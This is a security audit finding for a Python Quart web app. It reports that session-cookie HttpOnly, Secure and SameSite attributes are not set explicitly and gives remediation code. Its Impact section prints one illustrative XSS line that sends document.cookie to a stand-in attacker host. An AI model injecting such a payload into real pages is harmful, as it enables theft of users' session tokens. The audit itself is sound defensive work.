## Findings

### Medium Severity

#### ASVS-334-MED-001: No Explicit HttpOnly Configuration on Session Cookie

**Severity:** MEDIUM

**Location:**
- **File:** `v3/server/main.py`
- **Function:** `create_app`
- **Line:** 42

**Related Functions Checked:**
- `asfquart.construct()` (framework layer, not auditable)
- All authenticated endpoints in `pages.py` (14+ routes with `@asfquart.auth.require`)

**Vulnerable Code:**
```python
def create_app():
    # ...
    app = asfquart.construct('steve', app_dir=THIS_DIR, static_folder=None)
    import pages
    import api
    return app
```

**Description:**

The application does not explicitly configure session cookie security attributes (`SESSION_COOKIE_HTTPONLY`, `SESSION_COOKIE_SECURE`, `SESSION_COOKIE_SAMESITE`) anywhere in the auditable codebase. The `asfquart.construct()` call is the sole application factory, and no cookie attribute configuration follows it.

While Quart (based on Flask's API) defaults `SESSION_COOKIE_HTTPONLY` to `True`, the `asfquart` wrapper layer is not available for review and could potentially override this default. ASVS 3.3.4 requires **verification** that HttpOnly is set — this cannot be verified from the provided code.

**Gap Type:** Type A — No explicit control at the application level; entirely delegated to framework defaults through an unauditable wrapper.

**Data Flow:**
```
User authenticates via OAuth → asfquart sets session cookie → Cookie attributes configured by: ???
                                                                ↓
                                                    asfquart.construct() — no explicit config
                                                    No app.config['SESSION_COOKIE_HTTPONLY'] set
                                                    Framework default: True (assumed, not verified)
```

**Entry Points Affected:**

All authenticated endpoints that establish or extend sessions:
- OAuth callback (handled by `asfquart`)
- Every route with `@asfquart.auth.require` (14+ endpoints in `pages.py`)

**Proof of Concept:**

Without access to `asfquart.construct()` source, an auditor cannot confirm the session cookie response header includes:
```
Set-Cookie: session=<token>; HttpOnly; Secure; SameSite=Lax; Path=/
```

If the `asfquart` wrapper inadvertently sets `SESSION_COOKIE_HTTPONLY = False`, the session cookie would be accessible via `document.cookie` in any XSS context.

**Impact:**

If HttpOnly is not set, a cross-site scripting vulnerability anywhere in the application (including in templates rendering user-controlled election titles, issue descriptions, or flash messages) could be leveraged to steal session tokens via:
```javascript
fetch('https://attacker.example/steal?c=' + document.cookie)
```

**Remediation:**

Explicitly configure session cookie security attributes after app construction in `main.py`:

```python
def create_app():
    # ...
    app = asfquart.construct('steve', app_dir=THIS_DIR, static_folder=None)

    # Explicitly set session cookie security attributes (ASVS 3.3.4)
    app.config['SESSION_COOKIE_HTTPONLY'] = True
    app.config['SESSION_COOKIE_SECURE'] = True
    app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
    app.config['SESSION_COOKIE_NAME'] = '__Host-session'  # Cookie prefix for additional protection

    import pages
    import api
    return app
```

## Architecture Observations

1. **Framework Opacity:** The `asfquart` framework wraps Quart and handles session management, OAuth, and authentication. Since this layer is not available for review, critical security configurations (cookie attributes, session lifecycle, token generation) cannot be verified. This is a systemic audit limitation.

2. **Session Data vs. Session Token Separation:** The codebase properly distinguishes between session data (user attributes) and the session token (cookie value). Session data flows to templates for rendering; the session token never appears outside the `Set-Cookie` mechanism.

3. **No Custom Cookies:** The application creates no custom cookies — all cookie management is through the session framework. This simplifies the ASVS 3.3.4 audit surface to a single cookie (the session cookie).

4. **CSRF Token Placeholder:** The `basic_info()` function at line 85 sets `basic.csrf_token = 'placeholder'`. When this is eventually implemented as a real CSRF token, if stored as a cookie, it should also have `HttpOnly` set (unless the intended pattern is double-submit cookie, which requires JavaScript access). This is a future consideration.
